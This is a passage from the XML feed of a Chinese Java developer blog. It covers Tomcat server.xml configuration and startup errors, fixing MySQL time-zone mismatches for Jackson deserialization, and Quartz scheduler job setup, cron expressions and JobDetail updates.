protocol&#x3D;&quot;org.apache.coyote.http11.Http11AprProtocol&quot;</span><br><span class="line">               maxThreads&#x3D;&quot;150&quot; SSLEnabled&#x3D;&quot;true&quot; &gt;</span><br><span class="line">        &lt;UpgradeProtocol className&#x3D;&quot;org.apache.coyote.http2.Http2Protocol&quot; &#x2F;&gt;</span><br><span class="line">        &lt;SSLHostConfig&gt;</span><br><span class="line">            &lt;Certificate certificateKeyFile&#x3D;&quot;conf&#x2F;localhost-rsa-key.pem&quot;</span><br><span class="line">                         certificateFile&#x3D;&quot;conf&#x2F;localhost-rsa-cert.pem&quot;</span><br><span class="line">                         certificateChainFile&#x3D;&quot;conf&#x2F;localhost-rsa-chain.pem&quot;</span><br><span class="line">                         type&#x3D;&quot;RSA&quot; &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;SSLHostConfig&gt;</span><br><span class="line">    &lt;&#x2F;Connector&gt;</span><br><span class="line">    --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Define an AJP 1.3 Connector on port 8009 --&gt;</span><br><span class="line">    &lt;Connector port&#x3D;&quot;8009&quot; protocol&#x3D;&quot;AJP&#x2F;1.3&quot; redirectPort&#x3D;&quot;8443&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;!-- An Engine represents the entry point (within Catalina) that processes</span><br><span class="line">         every request.  The Engine implementation for Tomcat stand alone</span><br><span class="line">         analyzes the HTTP headers included with the request, and passes them</span><br><span class="line">         on to the appropriate Host (virtual host).</span><br><span class="line">         Documentation at &#x2F;docs&#x2F;config&#x2F;engine.html --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- You should set jvmRoute to support load-balancing via AJP ie :</span><br><span class="line">    &lt;Engine name&#x3D;&quot;Catalina&quot; defaultHost&#x3D;&quot;localhost&quot; jvmRoute&#x3D;&quot;jvm1&quot;&gt;</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;Engine name&#x3D;&quot;Catalina&quot; defaultHost&#x3D;&quot;localhost&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;!--For clustering, please take a look at documentation at:</span><br><span class="line">          &#x2F;docs&#x2F;cluster-howto.html  (simple how to)</span><br><span class="line">          &#x2F;docs&#x2F;config&#x2F;cluster.html (reference documentation) --&gt;</span><br><span class="line">      &lt;!--</span><br><span class="line">      &lt;Cluster className&#x3D;&quot;org.apache.catalina.ha.tcp.SimpleTcpCluster&quot;&#x2F;&gt;</span><br><span class="line">      --&gt;</span><br><span class="line"></span><br><span class="line">      &lt;!-- Use the LockOutRealm to prevent attempts to guess user passwords</span><br><span class="line">           via a brute-force attack --&gt;</span><br><span class="line">      &lt;Realm className&#x3D;&quot;org.apache.catalina.realm.LockOutRealm&quot;&gt;</span><br><span class="line">        &lt;!-- This Realm uses the UserDatabase configured in the global JNDI</span><br><span class="line">             resources under the key &quot;UserDatabase&quot;.  Any edits</span><br><span class="line">             that are performed against this UserDatabase are immediately</span><br><span class="line">             available for use by the Realm.  --&gt;</span><br><span class="line">        &lt;Realm className&#x3D;&quot;org.apache.catalina.realm.UserDatabaseRealm&quot;</span><br><span class="line">               resourceName&#x3D;&quot;UserDatabase&quot;&#x2F;&gt;</span><br><span class="line">      &lt;&#x2F;Realm&gt;</span><br><span class="line"></span><br><span class="line">      &lt;Host name&#x3D;&quot;localhost&quot;  appBase&#x3D;&quot;&#x2F;www&#x2F;yitieyilu.com&#x2F;yitieyiluopen&quot;</span><br><span class="line">            unpackWARs&#x3D;&quot;true&quot; autoDeploy&#x3D;&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- SingleSignOn valve, share authentication between web applications</span><br><span class="line">             Documentation at: &#x2F;docs&#x2F;config&#x2F;valve.html --&gt;</span><br><span class="line">        &lt;!--</span><br><span class="line">        &lt;Valve className&#x3D;&quot;org.apache.catalina.authenticator.SingleSignOn&quot; &#x2F;&gt;</span><br><span class="line">        --&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- Access log processes all example.</span><br><span class="line">             Documentation at: &#x2F;docs&#x2F;config&#x2F;valve.html</span><br><span class="line">             Note: The pattern used is equivalent to using pattern&#x3D;&quot;common&quot; --&gt;</span><br><span class="line">        &lt;Valve className&#x3D;&quot;org.apache.catalina.valves.AccessLogValve&quot; directory&#x3D;&quot;logs&quot;</span><br><span class="line">               prefix&#x3D;&quot;localhost_access_log&quot; suffix&#x3D;&quot;.txt&quot;</span><br><span class="line">               pattern&#x3D;&quot;%h %l %u %t &quot;%r&quot; %s %b&quot; &#x2F;&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;!-- 对应所有的安装包文件, 此处不配置--&gt;</span><br><span class="line"></span><br><span class="line">      &lt;&#x2F;Host&gt;</span><br><span class="line">    &lt;&#x2F;Engine&gt;</span><br><span class="line">  &lt;&#x2F;Service&gt;</span><br><span class="line">&lt;&#x2F;Server&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://linuxconfig.org/how-to-install-tomcat-9-on-debian-9-stretch-linux" target="_blank" rel="noopener">https://linuxconfig.org/how-to-install-tomcat-9-on-debian-9-stretch-linux</a> 推荐操作步骤<br><a href="https://gist.github.com/jniltinho/a7bd30288342a5d352e6" target="_blank" rel="noopener">https://gist.github.com/jniltinho/a7bd30288342a5d352e6</a>, 这里的tomcat.service中的<code>CATALINA_OPTS</code>配置可能导致不能启动tomcat</p><p>tomcat install failed:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> systemctl status tomcat</span><br><span class="line">● tomcat.service - Tomcat9</span><br><span class="line">   Loaded: loaded (&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;tomcat.service; enabled; vendor preset: enabled)</span><br><span class="line">   Active: failed (Result: exit-code) since Wed 2018-06-27 12:31:36 CST; 13s ago</span><br><span class="line">  Process: 1289 ExecStart&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcat9&#x2F;bin&#x2F;startup.sh (code&#x3D;exited, status&#x3D;2)</span><br><span class="line"></span><br><span class="line">6月 27 12:31:36 BQA startup.sh[1289]: Using CATALINA_BASE:   &#x2F;usr&#x2F;local&#x2F;tomcat9</span><br><span class="line">6月 27 12:31:36 BQA startup.sh[1289]: Using CATALINA_HOME:   &#x2F;usr&#x2F;local&#x2F;tomcat9</span><br><span class="line">6月 27 12:31:36 BQA startup.sh[1289]: Using CATALINA_TMPDIR: &#x2F;usr&#x2F;local&#x2F;tomcat9&#x2F;temp</span><br><span class="line">6月 27 12:31:36 BQA startup.sh[1289]: Using JRE_HOME:        &#x2F;usr</span><br><span class="line">6月 27 12:31:36 BQA startup.sh[1289]: Using CLASSPATH:       &#x2F;usr&#x2F;local&#x2F;tomcat9&#x2F;bin&#x2F;bootstrap.jar:&#x2F;usr&#x2F;local&#x2F;tomcat9&#x2F;bin&#x2F;tomcat-juli.jar</span><br><span class="line">6月 27 12:31:36 BQA startup.sh[1289]: Using CATALINA_PID:    &#x2F;tmp&#x2F;tomcat&#x2F;tomcat9.pid</span><br><span class="line">6月 27 12:31:36 BQA systemd[1]: tomcat.service: Control process exited, code&#x3D;exited status&#x3D;2</span><br><span class="line">6月 27 12:31:36 BQA systemd[1]: Failed to start Tomcat9.</span><br><span class="line">6月 27 12:31:36 BQA systemd[1]: tomcat.service: Unit entered failed state.</span><br><span class="line">6月 27 12:31:36 BQA systemd[1]: tomcat.service: Failed with result &#39;exit-code&#39;.</span><br><span class="line">root@BQA:&#x2F;usr&#x2F;local&#x2F;tomcat9&#x2F;bin# </span><br><span class="line">&#96;&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">tomcat start,but met 404, 可能文件有问题,重新安装按照上面的操作步骤.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>org.apache.jasper.JasperException: org.apache.jasper.JasperException: java.lang.ClassNotFoundException: org.apache.jsp.index_jsp<br> org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:572)<br> org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:390)<br> org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:386)<br> org.apache.jasper.servlet.JspServlet.service(JspServlet.java:330)<br> javax.servlet.http.HttpServlet.service(HttpServlet.java:741)<br> org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)<br>Root Cause</p><p>org.apache.jasper.JasperException: java.lang.ClassNotFoundException: org.apache.jsp.index_jsp</p><pre><code>### SEVERE: Could not contact [localhost:8005] (base port [8005] and offset [0])&gt;### initial-server-setup-with-debian-9 初始化debian系统&gt; 建用户和ufw### -----------------------------------------------------错误参数------------------------------------------### Caused by: org.springframework.jmx.export.UnableToRegisterMBeanException: Unable to register MBean [HikariDataSource (null)] with key &#39;dataSource&#39;; nested exception is javax.management.InstanceAlreadyExistsException: com.zaxxer.hikari:name=dataSource,type=HikariDataSource### Unable to register MBean [HikariDataSource (null)] with key &#39;dataSource&#39;; nested exception is javax.management.InstanceAlreadyExistsExceptionspring.jmx.enabled=truespring.jmx.default-domain=com.yitieyilu.core### The web application to have started a thread named [Abandoned connection cleanup thread] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread&gt; 将jdbcjar改成provide放在tomcat的lib目录### tomcat this web application instance has been stopped already. Could not load []. The following stack trace is thrown for debugging purposes as well as to attempt to terminate the thread which caused the illegal access&gt; 重启tomcat，缓存的问题</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;apr安装配置&quot;&gt;&lt;a href=&quot;#apr安装配置&quot; class=&quot;headerlink&quot; title=&quot;apr安装配置&quot;&gt;&lt;/a&gt;apr安装配置&lt;/h2&gt;&lt;h3 id=&quot;1-windows环境配置&quot;&gt;&lt;a href=&quot;#1-windows环境配置&quot; class</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="tomcat" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/tomcat/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>jackson序列化工具</title>
    <link href="https://seniortesting.club/posts/IgPZNxpwqG/"/>
    <id>https://seniortesting.club/posts/IgPZNxpwqG/</id>
    <published>2021-03-26T12:43:09.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<p>反序列化工具jackson使用</p><h2 id="jackson反序列化myql的datetime类型为LocalDateTime时间错误"><a href="#jackson反序列化myql的datetime类型为LocalDateTime时间错误" class="headerlink" title="jackson反序列化myql的datetime类型为LocalDateTime时间错误"></a>jackson反序列化myql的datetime类型为LocalDateTime时间错误</h2><blockquote><p>在jackson反序列化mysql中的datetime类型的数据的时候，发现时间总是不一致，发现是mysql的分区和当前运行程序的分区不一致导致的</p></blockquote><ul><li>检查mysql的时区：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">show variables like <span class="string">&quot;%time_zone%&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>+——————+——–+<br>| Variable_name  | Value |<br>+——————+——–+<br>| system_time_zone | CST  |<br>| time_zone    | SYSTEM |<br>+——————+——–+<br>2 rows in set (0.00 sec)<br>  #time_zone说明mysql使用system的时区，system_time_zone说明system使用CST时区</p><ul><li>修改mysql的时区：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第一种方法</span><br><span class="line">&gt; <span class="built_in">set</span> global time_zone = <span class="string">&#x27;+08:00&#x27;</span>; <span class="comment">##修改mysql全局时区为北京时间，即我们所在的东8区</span></span><br><span class="line">&gt; <span class="built_in">set</span> time_zone = <span class="string">&#x27;+08:00&#x27;</span>; <span class="comment">##修改当前会话时区</span></span><br><span class="line">&gt; flush privileges; <span class="comment">#立即生效</span></span><br><span class="line">第二种方法</span><br><span class="line"><span class="comment"># vim /etc/my.cnf ##在[mysqld]区域中加上</span></span><br><span class="line">default-time_zone = <span class="string">&#x27;+08:00&#x27;</span></span><br><span class="line"><span class="comment"># /etc/init.d/mysqld restart ##重启mysql使新时区生效</span></span><br></pre></td></tr></table></figure><h2 id="jackson-反序列化报错-InvalidDefinitionException-Cannot-construct-instance-ofcom-xxx-problem-java-lang-NullPointerException"><a href="#jackson-反序列化报错-InvalidDefinitionException-Cannot-construct-instance-ofcom-xxx-problem-java-lang-NullPointerException" class="headerlink" title="jackson 反序列化报错 InvalidDefinitionException: Cannot construct instance ofcom.xxx, problem:java.lang.NullPointerException`"></a>jackson 反序列化报错 <code>InvalidDefinitionException: Cannot construct instance of</code>com.xxx<code>, problem:</code>java.lang.NullPointerException`</h2><blockquote><p>jackson 反序列化的时候，对象需要有一个默认方法，否则无法构建对象</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;反序列化工具jackson使用&lt;/p&gt;
&lt;h2 id=&quot;jackson反序列化myql的datetime类型为LocalDateTime时间错误&quot;&gt;&lt;a href=&quot;#jackson反序列化myql的datetime类型为LocalDateTime时间错误&quot; class=&quot;</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="spring" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/spring/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>定时任务quartz问题整理</title>
    <link href="https://seniortesting.club/posts/IjkWUUxoRP/"/>
    <id>https://seniortesting.club/posts/IjkWUUxoRP/</id>
    <published>2021-03-26T12:41:06.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<p>整理一些常用的quartz技术问题</p><h2 id="extends-QuartzJobBean-和-implements-Job-difference"><a href="#extends-QuartzJobBean-和-implements-Job-difference" class="headerlink" title="extends QuartzJobBean 和 implements Job  difference"></a><code>extends QuartzJobBean</code> 和 <code>implements Job</code>  difference</h2><p>在spring-boot-quartz中使用提供的接口创建job的时候有两种方式：</p><ul><li>实现接口<code>Job</code></li></ul><p>如果采用的是implements job接口的形式创建job，name我们如何获取任务传递过来的外部参数呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(JobExecutionContext context)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// 通过访问 JobExecutionContext 获取JobDataMap 对象，从而访问对应的参数</span></span><br><span class="line">           JobDataMap jobDataMap = context.getJobDetail().getJobDataMap();</span><br><span class="line">           Object jobName = jobDataMap.get(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有没有一种更方便的形式进行访问获取<code>JobDataMap</code>中的参数和值呢？是的，这个就是<code>QuartzJobBean</code>类做得</p><ul><li>继承抽象类<code>QuartzJobBean</code></li></ul><p>官方的说明是： 更优雅采用java对象思想来访问传过来的参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyJob</span> <span class="keyword">extends</span> <span class="title">QuartzJobBean</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String parameter1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setParameter1</span><span class="params">(String parameter1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.parameter1 = parameter1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(JobExecutionContext context)</span> <span class="keyword">throws</span> JobExecutionException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;My job is running with &quot;</span>+parameter1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DisallowConcurrentExecution-配置quartz并发执行"><a href="#DisallowConcurrentExecution-配置quartz并发执行" class="headerlink" title="@DisallowConcurrentExecution 配置quartz并发执行"></a>@DisallowConcurrentExecution 配置quartz并发执行</h2><blockquote><p>可能有多个触发器使用该job，所以避免并发执行这个任务</p></blockquote><p>@DisallowConcurrentExecution<br>@PersistJobDataAfterExecution</p><h2 id="常用基本quartz-cron表达式"><a href="#常用基本quartz-cron表达式" class="headerlink" title="常用基本quartz cron表达式"></a>常用基本quartz cron表达式</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">每隔5秒执行一次：*/5 * * * * ?</span><br><span class="line"></span><br><span class="line"> 每隔1分钟执行一次：0 */1 * * * ?</span><br><span class="line"></span><br><span class="line"> 每天23点执行一次：0 0 23 * * ?</span><br><span class="line"></span><br><span class="line"> 每天凌晨1点执行一次：0 0 1 * * ?</span><br><span class="line"></span><br><span class="line"> 每月1号凌晨1点执行一次：0 0 1 1 * ?</span><br><span class="line"></span><br><span class="line"> 每月最后一天23点执行一次：0 0 23 L * ?</span><br><span class="line"></span><br><span class="line"> 每周星期天凌晨1点实行一次：0 0 1 ? * L</span><br><span class="line"></span><br><span class="line"> 在26分、29分、33分执行一次：0 26,29,33 * * * ?</span><br><span class="line"></span><br><span class="line"> 每天的0点、13点、18点、21点都执行一次：0 0 0,13,18,21 * * ?</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="quartz-state"><a href="#quartz-state" class="headerlink" title="quartz state"></a>quartz state</h2><p>see <a href="/org/quartz-scheduler/quartz/2.3.0/quartz-2.3.0-sources.jar!/org/quartz/impl/jdbcjobstore/Constants.java:142">org/quartz-scheduler/quartz/2.3.0/quartz-2.3.0-sources.jar!/org/quartz/impl/jdbcjobstore/Constants.java:142</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// STATES</span></span><br><span class="line"> String STATE_WAITING = <span class="string">&quot;WAITING&quot;</span>;</span><br><span class="line"></span><br><span class="line"> String STATE_ACQUIRED = <span class="string">&quot;ACQUIRED&quot;</span>;</span><br><span class="line"></span><br><span class="line"> String STATE_EXECUTING = <span class="string">&quot;EXECUTING&quot;</span>;</span><br><span class="line"></span><br><span class="line"> String STATE_COMPLETE = <span class="string">&quot;COMPLETE&quot;</span>;</span><br><span class="line"></span><br><span class="line"> String STATE_BLOCKED = <span class="string">&quot;BLOCKED&quot;</span>;</span><br><span class="line"></span><br><span class="line"> String STATE_ERROR = <span class="string">&quot;ERROR&quot;</span>;</span><br><span class="line"></span><br><span class="line"> String STATE_PAUSED = <span class="string">&quot;PAUSED&quot;</span>;</span><br><span class="line"></span><br><span class="line"> String STATE_PAUSED_BLOCKED = <span class="string">&quot;PAUSED_BLOCKED&quot;</span>;</span><br><span class="line"></span><br><span class="line"> String STATE_DELETED = <span class="string">&quot;DELETED&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="quartz修改-JobDetail的相关属性"><a href="#quartz修改-JobDetail的相关属性" class="headerlink" title="quartz修改 JobDetail的相关属性"></a>quartz修改 <code>JobDetail</code>的相关属性</h2><p>在实际运用中可能需要修改<code>JobDetail</code>中的描述或者名称或者<code>JobDataMap</code>,查了好久发现了一个隐藏很深的方法，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 先获取jobDetail实例（注意转换成: JobDetailImpl ,否则个别属性不能修改，例如Description)</span></span><br><span class="line">            JobDetailImpl jobDetail = (JobDetailImpl) scheduler.getJobDetail(jobKey);</span><br><span class="line">            CronTrigger cronTrigger = (CronTrigger) scheduler.getTrigger(triggerKey);</span><br><span class="line">            <span class="keyword">if</span> (jobDetail != <span class="keyword">null</span> &amp;&amp; cronTrigger != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (StrUtil.isNotEmpty(description)) &#123;</span><br><span class="line">                    jobDetail.setDescription(description);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">null</span> != jobData &amp;&amp; !jobData.isEmpty()) &#123;</span><br><span class="line">                    String trimJobData = jobData.trim();</span><br><span class="line">                    Map&lt;String, String&gt; updateParams = Splitter.on(<span class="string">&quot;\n&quot;</span>).withKeyValueSeparator(<span class="string">&quot;=&quot;</span>).split(trimJobData);</span><br><span class="line">                    jobDetail.getJobDataMap().putAll(updateParams);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 重點： 重新保存内容更新, 注意第二，三個參數</span></span><br><span class="line">                <span class="comment">// 第二個參數replace表示如果存在，替換掉</span></span><br><span class="line">                <span class="comment">// 第三個參數storeNonDurableWhileAwaitingScheduling表示，參見下方說明,所以此處需要設置被true</span></span><br><span class="line">                scheduler.addJob(jobDetail, <span class="keyword">true</span>, <span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>另外，如果需要每次執行完任務后都保存任務的相關配置參數，需要聲明任務是: StatefulJob,但是此方法已經過時，推薦的使用方法是直接添加兩個註解到<code>Job</code>上：<code>@DisallowConcurrentExecution</code>和<br><code>@PersistJobDataAfterExecution</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@DisallowConcurrentExecution</span></span><br><span class="line"><span class="meta">@PersistJobDataAfterExecution</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuleCrawlerJob</span> <span class="keyword">implements</span> <span class="title">Job</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>::: warning  JobDetail中的 durable requestRecovery屬性</p><blockquote><p>如果一个任务durable=false，那么当没有Trigger关联它的时候，它就会被自动删除 ，默認是false<br>如果一个任务是”requestRecovery”，那么当任务运行过程非正常退出时（比如进程崩溃，机器断电，但不包括抛出异常这种情况），Quartz再次启动时，会重新运行一次这个任务实例。<br>:::</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;整理一些常用的quartz技术问题&lt;/p&gt;
&lt;h2 id=&quot;extends-QuartzJobBean-和-implements-Job-difference&quot;&gt;&lt;a href=&quot;#extends-QuartzJobBean-和-implements-Job-differe</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="spring" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/spring/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>JDK版本新特性</title>
    <link href="https://seniortesting.club/posts/OFru0C2bVe/"/>
    <id>https://seniortesting.club/posts/OFru0C2bVe/</id>
    <published>2021-03-26T12:38:51.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
